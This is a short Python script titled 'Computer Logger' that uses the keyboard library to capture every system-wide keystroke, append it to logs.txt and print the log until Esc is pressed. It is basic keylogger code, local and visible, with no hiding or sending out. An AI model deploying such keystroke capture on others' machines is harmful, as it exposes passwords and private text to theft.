# Computer Logger
# Ryan Brinkman
# 11/15/2023

# imports
import keyboard

# main
def keyboardLogger():
    def on_key_event(e):
        with open("logs.txt", "a") as file:
            file.write(f'Key {e.name} {e.event_type}\n')

        with open("logs.txt", "r") as file:
            print(file.read())

    keyboard.hook(on_key_event)
    keyboard.wait('esc')

keyboardLogger()